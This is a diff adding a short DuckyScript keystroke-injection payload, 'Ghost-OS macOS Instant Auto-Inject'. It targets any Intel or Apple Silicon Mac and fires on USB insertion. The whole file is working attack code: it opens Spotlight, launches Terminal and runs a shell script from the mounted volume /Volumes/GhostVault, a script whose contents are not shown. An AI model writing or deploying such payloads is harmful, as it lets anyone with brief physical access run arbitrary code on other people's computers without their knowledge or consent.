@@ -1,0 +1,14 @@
+REM ==================================================================
+REM Ghost-OS macOS Instant Auto-Inject DuckyScript
+REM Target: Any Intel or Apple Silicon (M1-M4) Mac
+REM Triggers: Immediately upon USB physical insertion
+REM ==================================================================
+
+DELAY 600
+GUI SPACE
+DELAY 300
+STRING terminal
+ENTER
+DELAY 500
+STRING sh /Volumes/GhostVault/Launch-GhostOS.command
+ENTER
